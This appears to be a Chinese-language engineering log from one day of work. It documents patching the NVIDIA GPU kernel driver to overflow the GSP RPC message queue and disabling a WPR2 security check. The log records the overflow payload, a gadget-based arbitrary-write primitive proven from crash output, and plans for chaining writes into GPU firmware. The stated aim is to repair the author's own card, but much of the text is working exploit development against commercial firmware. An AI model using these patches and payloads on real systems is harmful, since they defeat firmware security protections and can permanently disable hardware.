# K3-1 注入环境搭建记录 (2026-09-30 傍晚)

日期: 2026-09-30 16:00-17:30
状态: 基础设施就绪, 注入未触发(缺用户态库)

---

## 一、610.57 驱动安装

### 从宿主传输

```bash
# 宿主
cd /usr/src && tar czf /tmp/nvidia610.tar.gz nvidia-610.57.04/
scp /tmp/nvidia610.tar.gz mods@127.0.0.1:/tmp/ -P 22292

# GSP固件
scp /usr/lib/firmware/nvidia/610.57.04/gsp_ga10x.bin mods@127.0.0.1:/tmp/gsp610.bin -P 22292
```

### 在 guest 安装

```bash
sudo tar xzf /tmp/nvidia610.tar.gz -C /usr/src/
sudo mkdir -p /lib/firmware/nvidia/610.57.04/
sudo cp /tmp/gsp610.bin /lib/firmware/nvidia/610.57.04/gsp_ga10x.bin

# 移除580, 安装610
sudo dkms remove nvidia/580.178.04 --all
sudo dkms install nvidia/610.57.04 --force
```

### 加载顺序 (关键!)

```bash
# 必须先卸载 systemd 自动加载的 nvidia
sudo rmmod nvidia_uvm 2>/dev/null
sudo rmmod nvidia_drm nvidia_modeset 2>/dev/null
sudo rmmod nvidia 2>/dev/null
sleep 2

# MODS 清 WPR2
sudo insmod /home/mods/mf215/driver/mods.ko
cd /home/mods/mf215
sudo timeout 90 ./mods -nc -m 'g_CheckVbiosSecurity=false;' \
  gputest.jse -test 2 -testarg 2 LoopMs 500 \
  -skip_azalia_init -null_display -no_vga -no_gold > /dev/null 2>&1
sudo rmmod mods

# 加载 610.57 (直接 insmod, 不用 modprobe 因为可能加载旧版)
sudo insmod /lib/modules/$(uname -r)/updates/dkms/nvidia.ko
sleep 15
cat /proc/driver/nvidia/version  # 确认 610.57.04
```

---

## 二、v17 溢出补丁

### 源码来源

```
不能用 /usr/src/nvidia-610.57.04/ 的文件 — 已被之前的补丁污染(XDIG标记残留)
必须用干净源码: /home/user/nvidia-live-recovery-lab/greenfield/open-gpu-kernel-modules/
  src/nvidia/src/kernel/gpu/gsp/message_queue_cpu.c (846行, 零污染)
```

### 打补丁

```bash
# 传干净源码到 guest
scp <干净源码路径> mods@127.0.0.1:/tmp/mq_clean.c -P 22292

# 替换并打补丁
sudo cp /tmp/mq_clean.c /usr/src/nvidia-610.57.04/src/nvidia/src/kernel/gsp/message_queue_cpu.c
sudo python3 ~/rpc_ovf_patch_v17.py \
  /usr/src/nvidia-610.57.04/src/nvidia/src/kernel/gpu/gsp/message_queue_cpu.c \
  33 0 73
# 输出: "v4 植入完成: helper=1 override=1 fill=1 cksum=1"
```

### 修复 _xdigPostInit

```bash
# v17 引用了 _xdigPostInit 但没在 kernel_gsp.c 定义
# 追加定义 (注意: 设为1=始终激活)
sudo bash -c "echo 'NvU32 _xdigPostInit = 1;' >> /usr/src/nvidia-610.57.04/src/nvidia/src/kernel/gpu/gsp/kernel_gsp.c"
```

### 硬编码注入参数

```bash
# ⚠️ sed 必须用 " * " 匹配多空格!
sudo sed -i 's/_xdigOvfK *= *0xffffffffu/_xdigOvfK = 33u/g' message_queue_cpu.c
sudo sed -i 's/_xdigOvfCk *= *1u/_xdigOvfCk = 0u/g' message_queue_cpu.c
sudo sed -i 's/_xdigOvfFn *= *0xffffffffu/_xdigOvfFn = 73u/g' message_queue_cpu.c
```

### 重编译

```bash
sudo dkms remove nvidia/610.57.04 --all
sudo dkms install nvidia/610.57.04 --force  # ~5分钟
dkms status  # 确认 installed
```

---

## 三、踩坑记录

| 问题 | 原因 | 解决 |
|------|------|------|
| anchorC 断言失败 | 源码被旧补丁污染 | 用 open-gpu-kernel-modules 的干净源码 |
| _xdigPostInit undefined | v17 期望在 kernel_gsp.c 定义 | 追加定义到文件末尾 |
| sed 不生效 | 源码里多空格 ` = ` | 用 ` *= *` 通配 |
| DKMS 编译失败 | _xdigPostInit 引用无定义 | kernel_gsp.c 加定义后重编译 |
| systemd 自动加载 nvidia | modules-load.d 强制加载 | 清空 /etc/modules-load.d/nvidia-utils.conf |
| nvidia-smi 版本不匹配 | 610内核 vs 580用户态 | 需要 610.57 的 libnvidia-ml.so |
| GSP固件找不到 | /lib/firmware/nvidia/610.57.04/ 目录不存在 | 手动创建并复制固件 |

---

## 四、当前状态

```
✓ 610.57 DKMS 驱动编译安装
✓ v17 溢出补丁植入 (K=33, ck=0, fn=73 硬编码)
✓ _xdigPostInit = 1 (始终激活)
✓ GSP 以 610.57 固件运行 (确认 /proc/driver/nvidia/version)
✗ 注入未触发 (nvidia-smi 版本不匹配, 无法发RPC)

下一步: 传输 610.57 用户态库
  libnvidia-ml.so.610.57.04
  libnvidia-glvkspirv.so.610.57.04
  libnvidia-eglcore.so.610.57.04
  libnvidia-gpucomp.so.610.57.04
  → 替换 /usr/lib/x86_64-linux-gnu/ 下的 580 版本
  → nvidia-smi 触发 RPC fn=73 → K3-1 溢出!
```

---

## 2026-09-30 下午追加: K3-1 注入首次实弹命中 + D3cold 事故

### 枪A开火成功记录 (10:28)

```
触发: nvidia-smi 610 (LD_LIBRARY_PATH=~/n610/lib + libnvidia-ml.so.1 软链)
前提: 昨晚 MODS 清了 WPR2 + 旧build模块(NVreg参数K=33)在内存中

dmesg 证据:
  XDIG_LATE: fn=72 K=33!            ← 注入钩子在 fn72 就瞄上了
  XDIG_SPY: fn=50331648             ← 读到毒数据(0x3000000) = 内存已污染
  XDIG: elem0 done
  XDIG: elem32 DEADBEEF             ← 元素32(溢出元素)写入共享队列!
  Xid 120: load access page fault (cause:0xd) @ pc:0x1b8ffbc
  RPC: fn73 SET_REGISTRY → during_incomplete_rpc = y
  sepc=0x1b8ffbc stval=0x4fe6 scause=0xd

结论:
  ✓ 溢出生效 (elem32 落地 = msgqMetadata 被覆盖)
  ✗ 崩溃签名 = 通道拆除路径 (0x1b8ffbc/0x4fe6), 不是预期的 DEADBEEF 取指fault
  原因: 旧build的fill是全DEADBEEF → meta+0xa0(rxAvail)=非零 → 不走rxrefresh分支
  修正: 枪A规格 = +0xa4=1, +0xa0=0(默认零), +0xb8=DEADBEEF (MAP模式)
```

### 枪A MAP 载荷 (已编入 10:34 build)

```c
// message_queue_cpu.c 496-498行:
static NvU32 _xdigOvfMapN = 2u;
static const NvU32 _xdigOvfMapOff[2] = { 0x100a4u, 0x100b8u };
static const NvU32 _xdigOvfMapVal[2] = { 0x00000001u, 0xDEADBEEFu };
// ovfOff = (elemIdx - 16)*0x1000 + byteOff;  elem32 → 0x10000+off
// OvfStart=16 来自 queueElementSizeMax(0x10000)/Min(0x1000)
```

### WPR2 bypass 补丁 (已编入同一build)

```c
// kernel_gsp.c 4805行: WPR2检查短路
if (0 && kgspIsWpr2Up_HAL(pGpu, pKernelGsp) &&   // 原来没有 "0 &&"
```

### 崩溃后状态恶化链 (核心发现!)

```
10:28 注入崩溃 → FSP 状态 0x29c (新状态,非0x177活/0x522死)
→ MODS 失败: "FSP boot cmds failed" (FSP mailbox仍响应但boot序列拒收)
→ 尝试 guest SBR + MNOC couple arm (PRC 00010104 成功, R1=1)
→ SBR 没消耗耦合 (guest虚拟SBR不达硬件层)
→ WPR2bypass+直接boot GSP → kgspBootstrap 挂死 (不等GSP_INIT_DONE)
→ QEMU system_reset 硬复位 → GPU 掉总线 (rev ff, D3cold!)
→ 宿主侧: vfio unbind/remove + 真SBR + 槽位电源setpci + 端口runtime唤醒 + 链路重训
  全部无效 (Presence=1但LinkStatus=0, 训练不成功)
→ DSDT: GPP0(00:01.1)无电源方法 → 卡内电源闩锁, 只有真实断电能清
```

### 教训

1. **每次注入开火 = 一次FSP毒化** → 下次开火前必须 MODS (而MODS要求FSP在可boot状态)
2. **GSP崩溃把SCRATCH打到0x29c后 MODS就废了** → 开火前要确认这个循环可以闭合
3. **QEMU system_reset 会让GPU掉总线(D3cold)** → 万不得已不要用, 关VM用monitor quit(干净路径)
4. guest 的 SBR (root port setpci) 不达硬件复位层, 白搭
5. nvidia-persistenced 会抢设备 → 序列里必须先 systemctl stop + pkill
6. nvidia-smi 610 需要 ~/n610/lib/libnvidia-ml.so.1 软链 (SONAME匹配)

### 恢复+再开火全自动脚本

`AUTO_FIRE.sh` — 断电重启后一键: vfio→VM→MODS→枪A模块→nvidia-smi开火→取证
判读标准:
  sepc=0xdeadbeef + scause=0xc → 枪A命中!
  pc=0x1b8ffbc + stval=0x4fe6  → 通道拆除(fill不对)
  WPR2_ERR_COUNT>0             → MODS失败,不要开火

---

# 2026-09-30 晚间: 宿主直射战役 — 四连击全记录

## 环境: 宿主直射(无VM)
- modprobe 拦截(/etc/modprobe.d/99-nvidia-block-for-gunA.conf: install /bin/false ×4)
- 补丁模块: /usr/src/nvidia-610.57.04 → dkms → zstdcat → insmod /tmp/nvidia_gun.ko
- 开火: HOST_FIRE.sh → insmod → nvidia-smi(原生610匹配) → fn73 → 注入
- 每枪 = 一次重启(结构性: 注入RPC必失败 → 初始化楔死 → 引用泄漏)

## 四连击弹着点

| 枪 | 弹药(+0xb8@gadget, +0x38@a1, +0xc0@a4, +0xa4) | 弹着点 | 结论 |
|----|------|--------|------|
| 枪A(下午,VM) | DEADBEEF, -, -, 1 | sepc=0xdeadbeee scause=0xc ra=0x1004c9e | 溢出✓劫持✓ |
| E1 | meta基址0x0fe4790e10, -, -, 1 | sepc=0x0fe4790e10 scause=0xc | 堆XN✓确定性✓(第三次逐位复验) |
| E3'(a1路径) | 0x1b52246(sw a4,0(a1)), 0xdead0000, 0x11223344, 1 | **无崩溃纯超时(Xid119)** | 静默落地✓ gadget真执行✓ 0xdead0000居然已映射 |
| E4-canary | 0x1b52246, 0x0418ff68, 0xdead0041, 1 | **pc=0x1aa3410 scause=0x8(ECALL断言)** | **任意写证实✓✓✓** |

## 关键弹道学情报(spy)

```
spy[0]: fn=72 GSP_SET_SYSTEM_INFO len=0x3d8 elems=1 seq=0x0
spy[1]: fn=73 SET_REGISTRY len=0x5f3 elems=1 seq=0x0  ← fn73也是seq=0!
```
- fn72和fn73都走seq=0(txSeqNum在它们之间不递增→fn72是"无响应追踪"型)
- 之前v18的txSeqNum-1=0xFFFFFFFF被GSP静默丢→纯超时(误判为gap未触发,实为seq=0的必然)
- MarkConsumed路径(gap触发)在这条init流上不可达;rxrefresh路径(ck=0)是唯一已证通路

## E3'/E4 的路径解剖(已证)

```
fn73(seq0, ck坏) → GSP pump: checksum失败 → 重试 → 读meta(已被elem32覆盖):
  +0xa4(rxLinked)=1 ✓非零 → +0xa0(rxAvail)=0 ✓ → "队列空" → rxrefresh:
    ld a5,[meta+0xb8]=gadget; ld a1,[meta+0x38]=目标; ld a4,[meta+0xc0]=值
    jalr → c.sw a4,0(a1) → ★写入★ → li a0,0; ret → rxrefresh视为成功
    → 重算rxAvail=0 → recv返"队列空" → 泵循环继续(每轮再调gadget!)
```

## 自由度清点
- 一次注入: gadget以(a1=meta+0x38值, a4=meta+0xc0值)被泵循环反复调用
- gadget写可以改meta自身 → 自修改状态机 → 理论上可链式多写
- 0xdead0000在GSP VA空间是已映射可写区(未fault) — 具体是什么区域待查

## 剩余工作(零重启静态阶段)
1. GSP寄存器窗口基址(MNOC: INFO_RECV/WDATA_RECV的GSP VA) — 从固件二进制挖
2. gadget库清查(52个store-ret候选): 找sd(8字节)/多写/循环copy型
3. 多写链编排: 一发内完成 MNOC报文(dwords到WDATA + trigger到INFO)
4. 终局弹: 清flash毒 → 冷启动 → 卡永久修复

---

# 终局路线分析(2026-09-30 深夜, 零重启静态阶段)

## 已知关键地址(汇总)

```
GSP 寄存器窗口基址: W = 0x08200000 (K3 泄漏读实证, runbook 记载)
  MNOC port1 WDATA_RECV(GSP VA) = 0x08A8F1F94
  MNOC port1 INFO_RECV(GSP VA)  = 0x08A8F1F90
  MNOC port0 WDATA/INFO         = 0x08A8F1F88 / 0x08A8F1F84
堆地址(三次跨启动复验): P=0x0fe4770e10, meta=P+0x20000=0x0fe4790e10
rxrefresh 回调实参: a0=meta+0x8c(固定) a1=*(meta+0x38)(全控) a2=4 a3=0 a4=*(meta+0xc0)(全控)
```

## 自修改状态机极限(已证死路)

泵循环每轮执行 *(a1)=a4 (gadget 0x1b52246), 完事后 a1/a4 从 meta+0x38/+0xc0 重读:
- a1 可推进: 步骤写 meta+0x38 → 下轮 a1 = 本轮 a4
- **a4 不可变**: 改它需写 meta+0xc0, 但写的值=a4自身 → 不动点
- ∴ 单gadget循环只能"常量值写到变地址序列" — 无法拼多dword MNOC 报文

## 终局路线A: 假对象树 + tdispmgr 蹦床(runbook 已布局)

```
gadget = tdispmgr(0x18BBD60), a1 = staging 假 pObj
已钉死: tdispmgr(a1) → s4 = *(pObj+0x2288)(假session) → 栈建 req[0xA4](全零+u16 0x0414)
        → mctpSubmit(0x1B594D0) → transport 0x150c170 → 真后端 EMEM/MNOC
待钉(下个静态会话, ~1-2h):
  1. mctpSubmit 对 pObj/session 的解引用字段
  2. transport 方法槽链(ctx+0x158/+0x1c8/+0x1d0)
  3. MNOC 后端 0x150a3b0 需要的对象字段
  4. 假对象树布局(staging 内, 含真叶子 W=0x08200000 等)
  5. fn 门控改晚期(fn=76)让初始化走得更远(建好FSP上下文)
```

## 终局路线B: Shot 0 — 翻 RmFspUseMnoc

```
写原语把 GSP 侧 ctx+0x1df 置1 → GSP 自身 FSP 流量切 MNOC 车道
→ 宿主正常 RPC 触发 GSP 的 FSP 流(CC/SPDM证书查询等)
前置: ctx 运行时地址(从 0x1509338 初始化函数全局回溯)
注: RmFspUseMnoc 不在宿主注册表(open-gpu-kernel-modules 无此键) — 只能 GSP 内部改
```

## 多写替代思路(备而未验)

- +0xc8 TX-post 槽(24 调用点, a0=*(meta+0x30) 全控) — GSP 发任何消息时触发
- MarkConsumed 的 +0xd0/+0xe0/+0xa8 附加槽 — 需 seq gap(已证此 init 流不可达)
- sd(8字节) gadget: 0x1b42b32 (c.sd a4,0x58(a0)) — sp 泄漏 0x10, 只适合一次性
- 52 个 store-ret gadget 候选清单: parallel/k3_device_work/gadget_store_ret.results.txt

## 射击成本模型

每枪 = 1 重启(结构性). 剩余预算:
- 路线A: 静态1-2h + Shot1(通道证明) + Shot2+(内容控制→FWUP) ≈ 2-4枪
- 路线B: ctx地址静态钉死 + 1枪翻标志 + RPC触发 ≈ 1-2枪(但FSP流量内容不受控)
- 终局: flash毒清除后冷启动 = 疗程重启

---

# 🏆 2026-09-30 深夜突破: bypass 模块 = 完整复活方案 (MODS 不再需要!)

## 发现链
1. guest 拦截 nvidia 自动加载后, MODS 公平审判仍失败 — 真凶是 PCIe 链路降级 (Gen1)
   (PHY 后遗症, 重训练到 Gen5 又回落; MODS 的 PState 测试硬编码期望 Gen4 → 拒跑)
2. 但注入流程不在乎链路速度 → 转病GSP路线打侦察弹 (解除武装+bypass)
3. ★ GSP 在 bypass 下完整启动存活! nvidia-smi 全表输出!
4. 补载 nvidia-uvm 后 CUDA 全通: cuInit/31.4GB显存/2GB分配/HtoD+DtoH数据一致

## 复活方案 (最终形态)
```
仅需: WPR2-bypass 补丁的 610.57.04 dkms 模块
  kernel_gsp.c: if (0 && kgspIsWpr2Up_HAL(...))   ← 4805行
  message_queue_cpu.c: XDIG 存在但 Fired=1 (解除武装,无害)
效果: 开机即工作, 无需 MODS/VM/任何手动步骤
毒窗仍在: WPR2=0x7ffffe00 (~2GB区域) 但被完全中和
```

## 技术要点
- guest 的 CUDA 需 nvidia_uvm 模块 + LD_LIBRARY_PATH 指向 610 用户态
- ctypes 传大尺寸要用 c_size_t (2GB 会溢出 32位 int)
- OVMF_VARS 会被 monitor quit 硬关损坏 → 换新模板即可
- pkill -f 会匹配自己的命令行导致自杀 (137) → 用精确匹配
- QEMU system_reset 会把 GPU 打进 D3cold → 断电才能救
